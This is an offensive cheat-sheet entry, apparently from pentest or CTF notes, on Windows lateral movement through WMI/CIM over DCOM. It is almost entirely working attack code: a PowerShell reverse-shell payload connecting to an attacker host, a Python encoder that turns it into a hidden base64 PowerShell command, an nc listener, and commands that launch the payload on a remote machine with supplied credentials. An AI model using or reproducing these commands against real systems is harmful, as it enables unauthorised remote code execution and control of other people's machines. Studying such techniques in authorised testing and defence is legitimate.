If a user isn't in "Remote Users" group, it may be inaccessible with options like rdp, winrm or psexec.

Python script to encode powershell command:
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("$(LHOST)",$(LPORT));$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
```bash
python3 encode.py
```
```bash
nc -lvnp $(LPORT)
```
On the target machine, run the following:
```powershell
$username = '$(USERNAME)';
```
```powershell
$password = '$(PASSWORD)';
```
```powershell
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
```
```powershell
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
```powershell
$Options = New-CimSessionOption -Protocol DCOM
```
```powershell
$Session = New-Cimsession -ComputerName $(TARGET_COMPUTER_IP) -Credential $credential -SessionOption $Options
```
```powershell
$Command = '$(OUTPUT_OF_PYTHON_SCRIPT)';
```
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```
